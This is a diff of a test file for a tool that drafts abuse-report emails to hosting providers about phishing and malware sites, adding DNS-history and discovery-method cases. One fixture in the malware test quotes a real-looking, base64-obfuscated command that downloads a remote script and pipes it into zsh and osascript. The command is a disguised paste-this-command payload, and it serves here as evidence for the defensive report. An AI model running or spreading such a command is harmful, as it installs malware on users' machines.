@@ -15,7 +15,7 @@ const certificate = (names: string[], fingerprint256: string) => ({
 function snapshot(overrides: Partial<OriginHostSnapshot> = {}): OriginHostSnapshot {
 	return originHostSnapshotSchema.parse({
 		kind: "cloudflare_origin_host",
-		version: 2,
+		version: 3,
 		recipient: "abuse@host.example.com",
 		providerLabel: "Example Hosting",
 		originalDomain: "login.example.com",
@@ -24,6 +24,8 @@ function snapshot(overrides: Partial<OriginHostSnapshot> = {}): OriginHostSnapsh
 		networks: [{ asn: 64500, holder: "EXAMPLE", prefixes: ["8.8.8.0/24"], discoverySources: ["registry_name_search"] }],
 		scan: { addressesScanned: 256, totalAddresses: 256, truncated: false, selectedPrefixes: [{ asn: 64500, prefix: "8.8.8.0/24" }], completedAt: "2026-10-30T22:49:00.000Z" },
 		servers: [],
+		dnsHistory: { hosts: ["login.example.com", "example.com", "www.example.com"], sources: ["virustotal"], recordsFound: 2 },
+		historicalResolutions: [],
 		kit: { abuse: "credential_theft", collects: ["sign-in email or phone", "password"], exfiltrationProbed: true, exfiltrationTargets: [] },
 		fingerprints: [],
 		siblingCandidateCount: 0,
@@ -78,13 +80,45 @@ describe("origin-host email draft", () => {
 		expect(body).toContain("1. Identify and suspend the service hosting login.example.com.");
 		expect(body).not.toContain("openssl");
 		expect(body).toContain("The hosting service therefore holds live victim credentials.");
+		expect(body).not.toContain("passive DNS");
+	});
+
+	test("without a server, names the unverified addresses the site resolved to in the host's network", () => {
+		const resolution = (ip: string, host: string, lastSeen: string) => ({ host, ip, lastSeen, sources: ["virustotal" as const], asn: 64500, prefix: "8.8.8.0/24" });
+		const { subject, body } = draft(snapshot({
+			historicalResolutions: [resolution("8.8.8.5", "login.example.com", "2026-10-28T09:00:00.000Z"), resolution("8.8.8.9", "example.com", "2026-09-01T00:00:00.000Z")],
+		}));
+		// The address is a lead, not a proof: the subject and the actions still ask the host to find the service.
+		expect(subject).toEndWith("for login.example.com");
+		expect(body).toContain([
+			"Before it moved behind Cloudflare, the site resolved to these addresses in your network (passive DNS, VirusTotal). They no longer serve the site, so this is unverified, but the customer who held them then may be the one behind it:",
+			"- 8.8.8.5 (login.example.com, last seen 2026-10-28 09:00 UTC)",
+			"- 8.8.8.9 (example.com, last seen 2026-09-01 00:00 UTC)",
+		].join("\n"));
+		expect(body).toContain("1. Identify and suspend the service hosting login.example.com.");
+		expect(body).not.toContain("Server: 8.8.8.5");
+
+		const many = draft(snapshot({ historicalResolutions: Array.from({ length: 7 }, (_, index) => resolution(`8.8.8.${index + 10}`, "login.example.com", "2026-10-28T09:00:00.000Z")) })).body;
+		expect(many).toContain("- 8.8.8.14 (login.example.com, last seen 2026-10-28 09:00 UTC)\n- and 2 more, listed in the attached evidence");
+		expect(many).not.toContain("8.8.8.15");
+	});
+
+	test("says a server found in the DNS history was found there, not by a sweep", () => {
+		const { body } = draft(snapshot({
+			scan: { addressesScanned: 0, totalAddresses: 256, truncated: false, selectedPrefixes: [], completedAt: "2026-10-30T22:01:00.000Z" },
+			servers: [{ ip: "8.8.8.5", asn: 64500, prefix: "8.8.8.0/24", certificate: certificate(["login.example.com"], "AA"), discovery: "dns_history" }],
+		}));
+		expect(body).toContain("Server: 8.8.8.5 (8.8.8.0/24, AS64500)");
+		expect(body).toContain("We found it in login.example.com's DNS history (passive DNS, VirusTotal): the address it resolved to before it moved behind Cloudflare, checked for both the certificate and captured kit bytes.");
+		expect(body).not.toContain("public IPv4 addresses");
+		expect(body).not.toContain("unverified");
 	});
 
 	test("lists every server and flags differing certificates", () => {
 		const { subject, body } = draft(snapshot({
 			servers: [
-				{ ip: "8.8.8.1", asn: 64500, prefix: "8.8.8.0/24", certificate: certificate(["login.example.com"], "AA") },
-				{ ip: "8.8.8.2", asn: 64500, prefix: "8.8.8.0/24", certificate: certificate(["login.example.com"], "BB") },
+				{ ip: "8.8.8.1", asn: 64500, prefix: "8.8.8.0/24", certificate: certificate(["login.example.com"], "AA"), discovery: "tls_sweep" },
+				{ ip: "8.8.8.2", asn: 64500, prefix: "8.8.8.0/24", certificate: certificate(["login.example.com"], "BB"), discovery: "tls_sweep" },
 			],
 		}));
 		expect(subject).toContain("credential phishing kit on 2 servers");
@@ -92,6 +126,7 @@ describe("origin-host email draft", () => {
 		expect(body).toContain("Servers:\n- 8.8.8.1 (8.8.8.0/24, AS64500)\n- 8.8.8.2 (8.8.8.0/24, AS64500)");
 		expect(body).toContain("The other servers present certificates for the same domain; the attached evidence lists each fingerprint.");
 		expect(body).toContain("1. Suspend the servers.");
+		expect(body).toContain("We found them by checking 256 public IPv4 addresses announced by AS64500 for both the certificate and captured kit bytes.");
 	});
 
 	test("caps the body's domain list and defers the rest to the evidence file", () => {
@@ -104,7 +139,7 @@ describe("origin-host email draft", () => {
 			submissionId: String(100 + index),
 		}));
 		const { body } = draft(snapshot({
-			servers: [{ ip: "8.8.8.1", certificate: certificate(["login.example.com"], "AA") }],
+			servers: [{ ip: "8.8.8.1", certificate: certificate(["login.example.com"], "AA"), discovery: "tls_sweep" }],
 			siblings,
 		}));
 		expect(body).toContain("- kit-38.example.net\n- and 21 more, listed in the attached evidence");
@@ -127,7 +162,7 @@ describe("origin-host email draft", () => {
 
 	test("describes malware distribution without credential claims", () => {
 		const { subject, body } = draft(snapshot({
-			servers: [{ ip: "8.8.8.1", certificate: certificate(["login.example.com"], "AA") }],
+			servers: [{ ip: "8.8.8.1", certificate: certificate(["login.example.com"], "AA"), discovery: "tls_sweep" }],
 			kit: { abuse: "malware", evidenceQuote: "Update your browser", collects: [], exfiltrationProbed: false, exfiltrationTargets: [] },
 		}));
 		expect(subject).toContain("Malware abuse: malware distribution site on 8.8.8.1");
@@ -143,7 +178,7 @@ describe("origin-host email draft", () => {
 		const command = `echo "https://apps.apple.com/app/macmorrow-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
 		const value = snapshot({
 			originalDomain: "macmorrow.app",
-			servers: [{ ip: "8.8.8.1", certificate: certificate(["macmorrow.app"], "AA") }],
+			servers: [{ ip: "8.8.8.1", certificate: certificate(["macmorrow.app"], "AA"), discovery: "tls_sweep" }],
 			kit: { abuse: "malware", evidenceQuote: command, collects: [], exfiltrationProbed: false, exfiltrationTargets: [] },
 		});
 		const email = draft(value);
